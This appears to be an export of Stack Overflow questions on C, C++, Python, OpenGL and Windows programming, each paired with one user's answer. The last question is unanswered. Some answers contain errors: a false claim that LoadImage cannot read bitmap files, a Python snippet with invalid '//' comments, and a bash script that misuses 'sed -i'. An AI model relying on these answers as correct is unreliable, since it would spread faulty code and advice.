"<p>When deploying the application to the device, the program will quit after a few cycles with the following error:</p>

<pre><code>Program received signal: ""EXC_BAD_ACCESS"".
</code></pre>

<p>The program runs without any issue on the iPhone simulator, it will also debug and run as long as I step through the instructions one at a time. As soon as I let it run again, I will hit the <code>EXC_BAD_ACCESS</code> signal.</p>

<p>In this particular case, it happened to be an error in the accelerometer code. It would not execute within the simulator, which is why it did not throw any errors. However, it would execute once deployed to the device.</p>

<p>Most of the answers to this question deal with the general EXC_BAD_ACCESS error, so I will leave this open as a catch-all for the dreaded Bad Access error.</p>

<p>EXC_BAD_ACCESS is typically thrown as the result of an illegal memory access. You can find more information in the answers below.</p>

<p>Have you encountered the <code>EXC_BAD_ACCESS</code> signal before, and how did you deal with it?</p>
","9530","Adam Rosenfield","<p>An EXC_BAD_ACCESS signal is the result of passing an invalid pointer to a system call.  I got one just earlier today with a test program on OS X - I was passing an uninitialized variable to <code>pthread_join()</code>, which was due to an earlier typo.</p>

<p>I'm not familiar with iPhone development, but you should double-check all your buffer pointers that you're passing to system calls.  Crank up your compiler's warning level all the way (with gcc, use the <code>-Wall</code> and <code>-Wextra</code> options).  Enable as many diagnostics on the simulator/debugger as possible.</p>
"
"<p>I'm racking my brain trying to come up with an elegant solution to a DLL load problem. I have an application that statically links to other lib files which load DLLs. I'm not loading the DLLs directly. I'd like to have some DLLs in another folder other than the folder that the executable is in. Something like %working_folder%\dlls - I'd rather not have dozens (yes ... dozens) of DLLs in my %working_folder%. </p>

<p>I'm trying to develop something that is part of the main app that will adjust the search path @ startup. The problem I'm running into is that this new custom DLL path isn't in the system search path. When I start the app it crashes (STATUS_DLL_NOT_FOUND) because the necessary DLLs are not in the appropriate places. What I'd like to do is to check @ startup if this new custom DLL folder is in the process environment variable search path and if not add it. Problem is, the application attempts to load all these DLLs before the app executes one line of code. </p>

<p>How do I fix this? I've considered writing a help app that starts first, adjusts the environment variables appropriately and the launches the main app via CreateProcess. This will work I'm sure of it but it makes things difficult on the developers. When they debug the main app they're not going to launch a helper app first - not that they could even do that.</p>

<p>I've tried the registry app path feature with no success. Same chicken and egg problem as before. </p>

<p>What can I do here?</p>
","9530","Adam Rosenfield","<p>[Edit - after re-reading the question I see that the problem you're having is that the DLLs are getting loaded before <code>main</code> starts]</p>

<p>I'm guessing that those libraries are written in C++ and are loading the DLLs from the constructor of some objects in global scope.  This is problematic.  Allow me to quote <a href=""http://www.yosefk.com/blog/consistency-how-to-defeat-the-purpose-of-ieee-floating-point.html"" rel=""nofollow"">Yossi Kreinin</a>:</p>

<blockquote>
  <p>Do it first thing in main(). If you use C++, you should do it first thing before main(), because people can use FP in constructors of global variables. This can be achieved by figuring out the compiler-specific translation unit initialization order, compiling your own C/C++ start-up library, overriding the entry point of a compiled start-up library using stuff like LD_PRELOAD, overwriting it in a statically linked program right there in the binary image, having a coding convention forcing to call FloatingPointSingleton::instance() before using FP, or shooting the people who like to do things before main(). It’s a trade-off.</p>
</blockquote>

<p>[Original answer below]</p>

<p>See <a href=""http://msdn.microsoft.com/en-us/library/ms682586(VS.85).aspx"" rel=""nofollow"">this page</a> for the search algorithm used for loading DLLs.  You can use <a href=""http://msdn.microsoft.com/en-us/library/ms686203(VS.85).aspx"" rel=""nofollow""><code>SetDllDirectory()</code></a> to add a directory to the DLL search path.</p>

<p>You also should be able to add a directory to the PATH environment variable using <a href=""http://msdn.microsoft.com/en-us/library/ms683188(VS.85).aspx"" rel=""nofollow""><code>GetEnvironmentVariable()</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/ms686206(VS.85).aspx"" rel=""nofollow""><code>SetEnvironmentVariable()</code></a>.</p>

<p>Another option is to change the current working directory to the folder containing the DLLs with <a href=""http://msdn.microsoft.com/en-us/library/aa365530(VS.85).aspx"" rel=""nofollow""><code>SetCurrentDirectory()</code></a>.  Just make sure to change the working directory back after loading the DLLs if you ever load any files using relative filenames.</p>
"
"<p><a href=""http://thedailywtf.com/Articles/nice_num,-mean_programmer.aspx"" rel=""nofollow"">The Daily WTF</a> for 2008-11-28 pillories the following code:</p>

<pre><code>static char *nice_num(long n)
{
    int neg = 0, d = 3;
    char *buffer = prtbuf;
    int bufsize = 20;

    if (n &lt; 0)
    {
        neg = 1;
        n = -n;
    }
    buffer += bufsize;
    *--buffer = '\0';

    do
    {
        *--buffer = '0' + (n % 10);
        n /= 10;
        if (--d == 0)
        {
            d = 3;
            *--buffer = ',';
        }
    }
    while (n);

    if (*buffer == ',') ++buffer;
    if (neg) *--buffer = '-';
    return buffer;
}
</code></pre>

<p>How would you write it?</p>
","9530","Adam Rosenfield","<p>If you're a seasoned C programmer, you'll realize this code isn't actually that bad.  It's relatively straightforward (for C), and it's blazingly fast.  It has three problems:</p>

<ol>
<li>It fails on the edge case of LONG_MIN (-2,147,483,648), since negating this number produces itself in twos-complement</li>
<li>It assumes 32-bit integers - for 64-bit longs, a 20-byte buffer is not big enough</li>
<li>It's not thread-safe - it uses a global static buffer, so multiple threads calling it at the same time will result in a race condition</li>
</ol>

<p>Problem #1 is easily solved with a special case.  To address #2, I'd separate the code into two functions, one for 32-bit integers and one for 64-bit integers.  #3 is a little harder - we have to change the interface to make completely thread-safe.</p>

<p>Here is my solution, based on this code but modified to address these problems:</p>

<pre><code>static int nice_num(char *buffer, size_t len, int32_t n)
{
  int neg = 0, d = 3;
  char buf[16];
  size_t bufsize = sizeof(buf);
  char *pbuf = buf + bufsize;

  if(n &lt; 0)
  {
    if(n == INT32_MIN)
    {
      strncpy(buffer, ""-2,147,483,648"", len);
      return len &lt;= 14;
    }

    neg = 1;
    n = -n;
  }

  *--pbuf = '\0';

  do
  {
    *--pbuf = '0' + (n % 10);
    n /= 10;
    if(--d == 0)
    {
      d = 3;
      *--pbuf = ',';
    }
  }
  while(n &gt; 0);

  if(*pbuf == ',') ++pbuf;
  if(neg) *--pbuf = '-';

  strncpy(buffer, pbuf, len);
  return len &lt;= strlen(pbuf);
}
</code></pre>

<p>Explanation: it creates a local buffer on the stack and then fills that in in the same method as the initial code.  Then, it copies it into a parameter passed into the function, making sure not to overflow the buffer.  It also has a special case for INT32_MIN.  The return value is 0 if the original buffer was large enough, or 1 if the buffer was too small and the resulting string was truncated.</p>
"
"<p>All,</p>

<p>I am trying to load up a bmp file into a GLubyte array (without using aux).</p>

<p>It is unbelievable how what I thought would have been a trivial task is sucking up hours of my time.</p>

<p>Can't seem to find anything on Google!</p>

<p>This is what I hacked together but it's not quite working:</p>

<pre><code>// load texture

GLubyte *customTexture;

string fileName(""C:\\Development\\Visual Studio 2008\\Projects\\OpenGL_Test\\Crate.bmp"");

// Use LoadImage() to get the image loaded into a DIBSection
HBITMAP hBitmap = (HBITMAP)LoadImage( NULL, (LPCTSTR)const_cast&lt;char*&gt;(fileName.c_str()), IMAGE_BITMAP, 0, 0, 
LR_CREATEDIBSECTION | LR_DEFAULTSIZE | LR_LOADFROMFILE );

customTexture = new GLubyte[3*256*256]; // size should be the size of the .bmp file

GetBitmapBits(hBitmap, 3*256*256, (LPVOID) customTexture);

GetBitmapDimensionEx(hBitmap,&amp;szBitmap);
</code></pre>

<p>What happens is the call to LoadImage seems to be returning Undefined Value (NULL? I am not able to figure out if it's actually loading the bmp or not - a bit confused).</p>

<p>At the moment I am converting bmps to raw then it's all easy.</p>

<p>Anyone has any better and cleaner snippet?</p>
","9530","Adam Rosenfield","<p><code>LoadImage()</code> can only load bitmaps that are embedded into your executable file with the resource compiler - it can't load external bitmaps from the filesystem.  Fortunately, bitmap files are really simple to read yourself.  See <a href=""http://en.wikipedia.org/wiki/Windows_bitmap"" rel=""nofollow"">Wikipedia</a> for a description of the file format.</p>

<p>Just open up the file like you would with any other file (<strong>important</strong>: open it in binary mode, i.e. with the <code>""rb""</code> option using <code>fopen</code> or the <code>ios::binary</code> flag using the C++ <code>ifstream</code>), read in the bitmap dimensions, and read in the raw pixel data.</p>
"
"<p>So far I've seen many posts dealing with equality of floating point numbers. The standard answer to a question like ""how should we decide if x and y are equal?"" is</p>

<pre><code>abs(x - y) &lt; epsilon
</code></pre>

<p>where epsilon is a <em>fixed</em>, small constant. This is because the ""operands"" x and y are often the results of some computation where a rounding error is involved, hence the standard equality operator == is not what we mean, and what we should really ask is whether x and y are <em>close</em>, not equal.</p>

<p>Now, I feel that if x is ""almost equal"" to y, then also x&#42;10^20 should be ""almost equal"" to y&#42;10^20, in the sense that the <em>relative</em> error should be the same (but ""relative"" to what?). But with these big numbers, the above test would fail, i.e. that solution does not ""scale"".</p>

<p>How would you deal with this issue? Should we rescale the numbers or rescale epsilon? How?
(Or is my intuition wrong?)</p>

<p>Here is a <a href=""http://stackoverflow.com/questions/21265/comparing-ieee-floats-and-doubles-for-equality"">related question</a>, but I don't like its accepted answer, for the reinterpret_cast thing seems a bit tricky to me, I don't understand what's going on. Please try to provide a simple test.</p>
","9530","Adam Rosenfield","<p>It all depends on the specific problem domain.  Yes, using relative error will be more correct in the general case, but it can be significantly less efficient since it involves an extra floating-point division.  If you know the approximate scale of the numbers in your problem, using an absolute error is acceptable.</p>

<p><a href=""http://www.cygnus-software.com/papers/comparingfloats/comparingfloats.htm"">This page</a> outlines a number of techniques for comparing floats.  It also goes over a number of important issues, such as those with subnormals, infinities, and NaNs.  It's a great read, I highly recommend reading it all the way through.</p>
"
"<p>This is a second-hand question from an OS development site, but it made me curious since I couldn't find a decent explanation anywhere.</p>

<p>When compiling and linking a free-standing C++ program using gcc, sometimes a linker error like this occurs:</p>

<pre><code>out/kernel.o:(.eh_frame+0x11): undefined reference to `__gxx_personality_v0'
</code></pre>

<p>This is apparently because this symbol is defined in libstdc++, which is missing in a free-standing environment. Fixing the problem simply requires defining this symbol somewhere:</p>

<pre><code>void *__gxx_personality_v0;
</code></pre>

<p>Which is nice, but I don't like things that just magically work... So the question is, what is the purpose of this symbol?</p>
","9530","Adam Rosenfield","<p>A quick grep of the <code>libstd++</code> code base revealed the following two usages of <code>__gx_personality_v0</code>:</p>

<p>In libsupc++/unwind-cxx.h</p>

<pre><code>// GNU C++ personality routine, Version 0.                                      
extern ""C"" _Unwind_Reason_Code __gxx_personality_v0
     (int, _Unwind_Action, _Unwind_Exception_Class,
      struct _Unwind_Exception *, struct _Unwind_Context *);
</code></pre>

<p>In libsupc++/eh_personality.cc</p>

<pre><code>#define PERSONALITY_FUNCTION    __gxx_personality_v0
extern ""C"" _Unwind_Reason_Code
PERSONALITY_FUNCTION (int version,
                      _Unwind_Action actions,
                      _Unwind_Exception_Class exception_class,
                      struct _Unwind_Exception *ue_header,
                      struct _Unwind_Context *context)
{
  // ... code to handle exceptions and stuff ...
}
</code></pre>

<p>(Note: it's actually a little more complicated than that; there's some conditional compilation that can change some details).</p>

<p>So, as long as your code isn't actually using exception handling, defining the symbol as <code>void*</code> won't affect anything, but as soon as it does, you're going to crash - <code>__gxx_personality_v0</code> is a function, not some global object, so trying to call the function is going to jump to address 0 and cause a segfault.</p>
"
"<p>What are the tensions between multithreading and exception-safety in C++? Are there good guidelines to follow? Does a thread terminate because of an uncaught exception?</p>
","9530","Adam Rosenfield","<p>I believe the C++ standard does not make any mention of multithreading - multithreading is a platform-specific feature.</p>

<p>I'm not exactly sure what the C++ standard says about uncaught exceptions in general, but according to <a href=""http://www.devx.com/tips/Tip/14240"" rel=""nofollow"">this page</a>, what happens is platform-defined, and you should find out in your compiler's documentation.</p>

<p>In a quick-and-dirty test I did with g++ 4.0.1 (i686-apple-darwin8-g++-4.0.1 to be specific), the result is that <code>terminate()</code> is called, which kills the entire program.  The code I used follows:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;pthread.h&gt;

void *threadproc(void *x)
{
  throw 0;

  return NULL;
}

int main(int argc, char **argv)
{
  pthread_t t;
  pthread_create(&amp;t, NULL, threadproc, NULL);

  void *ret;
  pthread_join(t, &amp;ret);

  printf(""ret = 0x%08x\n"", ret);

  return 0;
}
</code></pre>

<p>Compiled with <code>g++ threadtest.cc -lpthread -o threadtest</code>.  Output was:</p>

<pre><code>terminate called after throwing an instance of 'int'
</code></pre>
"
"<p>I need to check whether a page is being redirected or not without actually downloading the content. I just need the final URL. What's the best way of doing this is Python?
Thanks!</p>
","9530","Adam Rosenfield","<p>If you specifically want to avoid downloading the content, you'll need to use the HEAD request method.  I believe the <code>urllib</code> and <code>urllib2</code> libraries do not support HEAD requests, so you'll have to use the lower-level <code>httplib</code> library:</p>

<pre><code>import httplib

h = httplib.HTTPConnection('www.example.com')
h.request('HEAD', '/')
response = h.getresponse()

// Check for 30x status code
if 300 &lt;= response.status &lt; 400:
    // It's a redirect
    location = response.getheader('Location')
</code></pre>
"
"<p>Hello
I would like to create infrastructure to handle events for my opengl project.
It should be similar to what wpf has - 3 types of events - direct, tunneling, bubbling.
I then want to handle events such as mouse up, down, move etc.
How should i approach this problem? Is there any library to handle this.
thanks</p>
","9530","Adam Rosenfield","<p>The <a href=""http://www.opengl.org/resources/libraries/glut/"" rel=""nofollow"">OpenGL Utility Toolkit</a> (GLUT) provides precisely this - you set up a bunch of event handlers for things like keyboard input, mouse input, redrawing the display, and window resizing, call the <code>glutMainLoop()</code> function, and you're good to go.</p>
"
"<p>I'm attempting to use Python to convert a multi-page PDF into a series of JPEGs. I can split the PDF up into individual pages easily enough with available tools, but I haven't been able to find anything that can covert PDFs to images.</p>

<p>PIL does not work, as it can't read PDFs. The two options I've found are using either GhostScript or ImageMagick through the shell. This is not a viable option for me, since this program needs to be cross-platform, and I can't be sure either of those programs will be available on the machines it will be installed and used on.</p>

<p>Are there any Python libraries out there that can do this?</p>
","9530","Adam Rosenfield","<p>ImageMagick has <a href=""http://www.imagemagick.org/download/python/"">Python bindings</a>.</p>
"
"<p>I'm building a GUI class for C++ and dealing a lot with pointers.  An example call:</p>

<pre><code>mainGui.activeWindow-&gt;activeWidget-&gt;init();
</code></pre>

<p>My problem here is that I want to cast the <strong>activeWidget</strong> pointer to another type.  <strong>activeWidget</strong> is of type GUI_BASE.  Derived from BASE I have other classes, such as GUI_BUTTON and GUI_TEXTBOX.  I want to cast the <strong>activeWidget</strong> pointer from GUI_BASE to GUI_TEXTBOX.  I assume it would look something like this:</p>

<pre><code>(GUI_TEXTBOX*)(mainGui.activeWindow-&gt;activeWidget)-&gt;function();
</code></pre>

<p>This isn't working, because the compiler still thinks the pointer is of type GUI_BASE.  The following bit of code does work, however:</p>

<pre><code>GUI_TEXTBOX *textbox_pointer;
textbox_pointer = (GUI_TEXTBOX*)mainGui.activeWindow-&gt;activeWidget;
textbox_pointer-&gt;function();
</code></pre>

<p>I'm hoping my problem here is just a syntax issue.  Thanks for the help :)</p>
","9530","Adam Rosenfield","<p>The problem is that casts have lower precedence than the . -> () [] operators.  You'll have to use a C++ style cast or add extra parentheses:</p>

<pre><code>((GUI_TEXTBOX*)mainGui.activeWindow-&gt;activeWidget)-&gt;function();  // Extra parentheses
dynamic_cast&lt;GUI_TEXTBOX*&gt;(mainGui.activeWindow-&gt;activeWidget)-&gt;function();  // C++ style cast
</code></pre>
"
"<p>I need to store a double as a string.  I know I  can use <code>printf</code> if I wanted to display it, but I just want to store it in a string variable so that I can store it in a map later.</p>
","9530","Adam Rosenfield","<pre><code>// The C way:
char buffer[32];
snprintf(buffer, sizeof(buffer), ""%g"", myDoubleVar);

// The C++03 way:
std::ostringstream sstream;
sstream &lt;&lt; myDoubleVar;
std::string varAsString = sstream.str();

// The C++11 way:
std::string varAsString = std::to_string(myDoubleVar);

// The boost way:
std::string varAsString = boost::lexical_cast&lt;std::string&gt;(myDoubleVar);
</code></pre>
"
"<p>I have been noticing some very strange usage of O(1) in discussion of algorithms involving hashing and types of search, often in the context of using a dictionary type provided by the language system, or using dictionary or hash-array types used using array-index notation.</p>

<p>Basically, O(1) means bounded by a constant time and (typically) fixed space.  Some pretty fundamental operations are O(1), although using intermediate languages and special VMs tends to distort ones thinking here (e.g., how does one amortize the garbage collector and other dynamic processes over what would otherwise be O(1) activities).</p>

<p>But ignoring amortization of latencies, garbage-collection, and so on, I still don't understand how the leap to assumption that certain techniques that involve some kind of searching can be O(1) except under very special conditions.</p>

<p>Although I have noticed this before, an example just showed up in the <a href=""http://stackoverflow.com/questions/330978/proper-collection-to-use-to-obtain-items-in-o1-time-in-c-net"">Pandincus question, ""'Proper’ collection to use to obtain items in O(1) time in C# .NET?""</a>.</p>

<p>As I remarked there, the only collection I know of that provides O(1) access as a guaranteed bound is a fixed-bound array with an integer index value.  The presumption is that the array is implemented by some mapping to random access memory that uses O(1) operations to locate the cell having that index.</p>

<p>For collections that involve some sort of searching to determine the location of a matching cell for a different kind of index (or for a sparse array with integer index), life is not so easy.  In particular, if there are collisons and congestion is possible, access is not exactly O(1).  And if the collection is flexible, one must recognize and amortize the cost of expanding the underlying structure (such as a tree or a hash table) for <strike>which</strike> congestion relief (e.g., high collision incidence or tree imbalance).</p>

<p>I would never have thought to speak of these flexible and dynamic structures as O(1).  Yet I see them offered up as O(1) solutions without any identification of the conditions that must be maintained to actually have O(1) access be assured (as well as have that constant be negligibly small).</p>

<p>THE QUESTION: All of this preparation is really for a question.  What is the casualness around O(1) and why is it accepted so blindly?  Is it recognized that even O(1) can be undesirably large, even though near-constant?  Or is O(1) simply the appropriation of a computational-complexity notion to informal use?  I'm puzzled.</p>

<p>UPDATE: The Answers and comments point out where I was casual about defining O(1) myself, and I have repaired that.  I am still looking for good answers, and some of the comment threads are rather more interesting than their answers, in a few cases.</p>
","9530","Adam Rosenfield","<p>The problem is that people are really sloppy with terminology.  There are 3 important but distinct classes here:</p>

<h3>O(1) worst-case</h3>

<p>This is simple - all operations take no more than a constant amount of time in the worst case, and therefore in all cases.  Accessing an element of an array is <code>O(1)</code> worst-case.</p>

<h3>O(1) amortized worst-case</h3>

<p><em>Amortized</em> means that not every operation is <code>O(1)</code> in the worst case, but for any sequence of N operations, the total cost of the sequence is no <code>O(N)</code> in the worst case.  This means that even though we can't bound the cost of any single operation by a constant, there will always be enough ""quick"" operations to make up for the ""slow"" operations such that the running time of the sequence of operations is linear in the number of operations.</p>

<p>For example, the standard <a href=""http://en.wikipedia.org/wiki/Dynamic_array"" rel=""nofollow"">Dynamic Array</a> which doubles its capacity when it fills up requires <code>O(1)</code> amortized time to insert an element at the end, even though some insertions require <code>O(N)</code> time - there are always enough <code>O(1)</code> insertions that inserting N items always takes <code>O(N)</code> time total.</p>

<h3>O(1) average-case</h3>

<p>This one is the trickiest.  There are two possible definitions of average-case: one for randomized algorithms with fixed inputs, and one for deterministic algorithms with randomized inputs.</p>

<p>For randomized algorithms with fixed inputs, we can calculate the average-case running time for any given input by analyzing the algorithm and determining the probability distribution of all possible running times and taking the average over that distribution (depending on the algorithm, this may or may not be possible due to the Halting Problem).</p>

<p>In the other case, we need a probability distribution over the inputs.  For example, if we were to measure a sorting algorithm, one such probability distribution would be the distribution that has all N! possible permutations of the input equally likely.  Then, the average-case running time is the average running time over all possible inputs, weighted by the probability of each input.</p>

<p>Since the subject of this question is hash tables, which are deterministic, I'm going to focus on the second definition of average-case.  Now, we can't always determine the probability distribution of the inputs because, well, we could be hashing just about anything, and those items could be coming from a user typing them in or from a file system.  Therefore, when talking about hash tables, most people just assume that the inputs are well-behaved and the hash function is well behaved such that the hash value of any input is essentially randomly distributed uniformly over the range of possible hash values.</p>

<p>Take a moment and let that last point sink in - the <code>O(1)</code> average-case performance for hash tables comes from assuming all hash values are uniformly distributed.  If this assumption is violated (which it usually isn't, but it certainly can and does happen), the running time is no longer <code>O(1)</code> on average.</p>

<p>See also <a href=""http://www.cs.rice.edu/~scrosby/hash/CrosbyWallach_UsenixSec2003.pdf"" rel=""nofollow"">Denial of Service by Algorithmic Complexity</a>.  In this paper, the authors discuss how they exploited some weaknesses in the default hash functions used by two versions of Perl to generate large numbers of strings with hash collisions.  Armed with this list of strings, they generated a denial-of-service attack on some webservers by feeding them these strings that resulted in the worst-case <code>O(N)</code> behavior in the hash tables used by the webservers.</p>
"
"<p>We have recently been faced with the problem of porting our C++ framework to an ARM platform running uClinux where the only vendor supported compiler is GCC 2.95.3. The problem we have run into is that exceptions are extremely unreliable causing everything from not being caught at all to being caught by an unrelated thread(!). This seems to be a documented bug, i.e. <a href=""http://gcc.gnu.org/ml/gcc/2003-08/msg01013.html"">here</a> and <a href=""http://osdir.com/ml/lib.uclibc.general/2003-05/msg00121.html"">here</a>.</p>

<p>After some deliberation we decided to eliminate exceptions altoghether as we have reached a point where exceptions do a lot of damage to running applications. The main concern now is how to manage cases where a constructor failed.</p>

<p>We have tried <a href=""http://www.informit.com/guides/content.aspx?g=cplusplus&amp;seqNum=264"">lazy evaluation</a>, where each method has the ability to instantiate dynamic resources and return a status value but that means that every class method has to return a return value which makes for a <strong>lot</strong> of ifs in the code and is very annoying in methods which generally would never cause an error.</p>

<p>We looked into adding a static <em>create</em> method which returns a pointer to a created object or NULL if creation failed but that means we cannot store objects on the stack anymore, and there is still need to pass in a reference to a status value if you want to act on the actual error.</p>

<p>According to Google's C++ Style Guide they <a href=""http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml#Exceptions"">do not use exceptions</a> and only do trivial work in their constructors, using an init method for non-trivial work (<a href=""http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml#Doing_Work_in_Constructors"">Doing Work in Constructors</a>). I cannot however find anything about how they handle construction errors when using this approach.</p>

<p>Has anyone here tried eliminating exceptions and come up with a good solution to handling construction failure?</p>
","9530","Adam Rosenfield","<p>If a constructor is only doing trivial things like initializing POD variables (and calling other trivial constructors implicitly), then it can't possibly fail.  See the <a href=""http://yosefk.com/c++fqa/ctors.html#fqa-10.17"" rel=""nofollow"">C++ FQA</a>; see also <a href=""http://yosefk.com/c++fqa/exceptions.html#fqa-17.10"" rel=""nofollow"">why you shouldn't use C++ exceptions</a>.</p>
"
"<p>I'm a C++ guy learning Java. I'm reading Effective Java and something confused me. It says never to write code like this:</p>

<pre><code>String s = new String(""silly"");
</code></pre>

<p>Because it creates unnecessary String objects. But instead it should be written like this:</p>

<pre><code>String s = ""No longer silly"";
</code></pre>

<p>Ok fine so far...However, given this class:</p>

<pre><code>public final class CaseInsensitiveString{
    private String s;
    public CaseInsensitiveString(String s){
    	if (s == null) {
    		throw new NullPointerException();
        }
    	this.s = s;
    }
    :
    :
}

CaseInsensitiveString cis = new CaseInsensitiveString(""Polish"");
String s = ""polish"";
</code></pre>

<ol>
<li><p>Why is the first statement ok? Shouldn't it be </p>

<p>CaseInsensitiveString cis = ""Polish"";</p></li>
<li><p>How do i make CaseInsensitiveString behave like String so the above statement is ok (with and w/out extending String)? What is it about String that makes it ok to just be able to pass it a literal like that? From my understanding there is no ""copy constructor"" concept in Java right?</p></li>
</ol>
","9530","Adam Rosenfield","<p><code>String</code> is a special built-in class of the language.  It is for the <code>String</code> class <strong>only</strong> in which you should avoid saying</p>

<pre><code>String s = new String(""Polish"");
</code></pre>

<p>Because the literal <code>""Polish""</code> is already of type <code>String</code>, and you're creating an extra unnecessary object.  For any other class, saying</p>

<pre><code>CaseInsensitiveString cis = new CaseInsensitiveString(""Polish"");
</code></pre>

<p>is the correct (and only, in this case) thing to do.</p>
"
"<p>Are there benefits of passing by pointer over passing by reference in C++?</p>

<p>Lately, I have seen a number of examples that pass the a pointer instead of passing by reference.  Are there benefits to doing this?</p>

<p>Example:</p>

<pre><code>func(SPRITE *x);
</code></pre>

<p>with a call of</p>

<pre><code>func(&amp;mySprite);
</code></pre>

<p>vs.</p>

<pre><code>func(SPRITE &amp;x);
</code></pre>

<p>with a call of</p>

<pre><code>func(mySprite);
</code></pre>
","9530","Adam Rosenfield","<p>A pointer can receive a NULL parameter, a reference parameter can not.  If there's ever a chance that you could want to pass ""no object"", then use a pointer instead of a reference.</p>

<p>Also, passing by pointer allows you to explicitly see at the call site whether the object is passed by value or by reference:</p>

<pre><code>// Is mySprite passed by value or by reference?  You can't tell 
// without looking at the definition of func()
func(mySprite);

// func2 passes ""by pointer"" - no need to look up function definition
func2(&amp;mySprite);
</code></pre>
"
"<p>I am running a program and want to see what its return code is (since it returns different codes based on different errors).</p>

<p>I know in Bash I can do this by running</p>

<blockquote>
  <p>echo $?</p>
</blockquote>

<p>What do I do when using cmd.exe on Windows?</p>
","9530","Adam Rosenfield","<p>Use the built-in ERRORLEVEL Variable:</p>

<pre><code>echo %ERRORLEVEL%
</code></pre>

<p>But <a href=""http://blogs.msdn.com/oldnewthing/archive/2008/09/26/8965755.aspx"">beware if an application has defined an environment variable named ERRORLEVEL</a>!</p>
"
"<p>I essentially want to spider my local site and create a list of all the titles and URLs as in:</p>

<pre>
http://localhost/mySite/Default.aspx      My Home Page
http://localhost/mySite/Preferences.aspx  My Preferences
http://localhost/mySite/Messages.aspx     Messages
</pre>

<p>I'm running Windows.  I'm open to anything that works--a C# console app, PowerShell, some existing tool, etc.  We can assume that the  tag does exist in the document.</p>

<p>Note:  I need to actually spider the files since the title may be set in code rather than markup.</p>
","9530","Adam Rosenfield","<p>A quick and dirty Cygwin Bash script which does the job:</p>

<pre><code>#!/bin/bash
for file in $(find $WWWROOT -iname \*.aspx); do
  echo -en $file '\t'
  cat $file | tr '\n' ' ' | sed -i 's/.*&lt;title&gt;\([^&lt;]*\)&lt;\/title&gt;.*/\1/'
done
</code></pre>

<p>Explanation: this finds every .aspx file under the root directory $WWWROOT, replaces all newlines with spaces so that there are no newlines between the <code>&lt;title&gt;</code> and <code>&lt;/title&gt;</code>, and then grabs out the text between those tags.</p>
"
"<p>I am working on a 2D game using OpenGL ES. I am using the orthographic projection, since it makes the 2D stuff easy. Now I would like to create a simple 3D effect, say rotate a sprite around the Y axis (something like cover flow). If I understand things correctly, this can’t be done in the ortho projection. Is it possible to do it without messing up the rest of the code? Like switch the projection in the middle of the frame, treat the current frame image as a background and draw the 3D stuff above the background?</p>
","9530","Adam Rosenfield","<p>Yes, this is possible: just save the old projection matrix, load a new one, and restore the old one when you're done.</p>

<pre><code>void DrawScene()
{
  Draw2DStuff();

  glMatrixMode(GL_PROJECTION);
  glPushMatrix();  // Save old projection matrix
  gluPerspective(...);  // Load new projection matrix

  Draw3DStuff();

  glMatrixMode(GL_PROJECTION);
  glPopMatrix();  // Restore old projection matrix
}
</code></pre>

<p>Just be careful about the depth buffer - you may need to play around with the depth buffer settings when switching between 2D and 3D rendering in order for things to get drawn correctly.</p>
"
"<p>This could be a little off the ballpark, but a friend asked me about it and it's kind of bothering me. How do you figure out the current path in your address bar if the server redirects all requests to a default file, say, index.html.</p>

<p>Let's say you entered:</p>

<pre><code>www.example.com/
</code></pre>

<p>And your server configuration automatically redirects this request to     </p>

<pre><code>www.example.com/index.html
</code></pre>

<p>But the address in your url bar does not change! So how do you figure out using Javascript that the path on this url is index.html? </p>

<p>I looked into location.pathname but that's only giving me /.</p>

<p>Any ideas?</p>
","9530","Adam Rosenfield","<p>The problem is that it's not actually a redirect.  When you type <code>'www.example.com'</code> into your web browser, the browser generates an HTTP request like the following:</p>

<pre><code>GET / HTTP/1.1
User-Agent: curl/7.16.3 (i686-pc-cygwin) libcurl/7.16.3 OpenSSL/
0.9.8h zlib/1.2.3 libssh2/0.15-CVS
Host: www.example.com
Accept: */*
</code></pre>

<p>Note that it's requesting a document named literally <code>/</code>.  There are two possible responses by the server:</p>

<pre><code>HTTP/1.1 200 OK
(more headers)

Content...
</code></pre>

<p>And</p>

<pre><code>HTTP/1.1 301 Moved Permanently
Location: (location of redirect)
(more headers)

(Optional content)
</code></pre>

<p>In Case #2, you can get the redirect location since it's actually a redirect.  But in Case #1, the <em>server</em> is doing the redirection: it sees a request for <code>/</code> and instead serves up the content for whatever its index page is (e.g. <code>index.html</code>, <code>index.php</code>, <code>default.aspx</code>, etc.).  As far as your browser is concerned, that's just the content for the document <code>/</code>.  It doesn't know it's been redirected.</p>
"
"<p>Okay, C++ newbie question here.  I checked out a copy of a C++ application from SourceForge (HoboCopy, if you're curious) and tried to compile it, but Visual Studio tells me that it can't find a particular header file.  I found the file in the source tree, but where do I need to put it so that it will be found when compiling?  Are there special directories?</p>
","9530","Adam Rosenfield","<p>If the project came with a Visual Studio project file, then that should already be configured to find the headers for you.  If not, you'll have to add the include file directory to the project settings by right-clicking the project and selecting Properties, clicking on ""C/C++"", and adding the directory containing the include files to the ""Additional Include Directories"" edit box.</p>
"
"<p>EDIT: I've tagged this C in a hope to get more response.  It's more the theory I'm interested in than a specific language implementation.  So if you're a C coder please treat the following PHP as pseudo-code and feel free to respond with an answer written in C.</p>

<p>I am trying to speed up a PHP CLI script by having it execute its tasks in parallel instead of serial.  The tasks are completely independent of each other so it doesn't matter which order they start/finish in.</p>

<p>Here's the original script (note all these examples are stripped-back for clarity):</p>

<pre><code>&lt;?php

$items = range(0, 100);

function do_stuff_with($item) { echo ""$item\n""; }

foreach ($items as $item) {
    do_stuff_with($item);
}
</code></pre>

<p>I've managed to make it work on the <code>$items</code> in parallel with <a href=""http://php.net/pcntl_fork"" rel=""nofollow""><code>pcntl_fork()</code></a> as shown below:</p>

<pre><code>&lt;?php

ini_set('max_execution_time', 0); 
ini_set('max_input_time', 0); 
set_time_limit(0);

$items = range(0, 100);

function do_stuff_with($item) { echo ""$item\n""; }

$pids = array();
foreach ($items as $item) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        die(""couldn't fork()"");
    } elseif ($pid &gt; 0) {
        // parent
        $pids[] = $pid;
    } else {
        // child
        do_stuff_with($item);
        exit(0);
    }   
}

foreach ($pids as $pid) {
    pcntl_waitpid($pid, $status);
}
</code></pre>

<p>Now I want to extend this so there's a maximum of, say, 10 children active at once.  What's the best way of handling this?  I've tried a few things but haven't had much luck.</p>
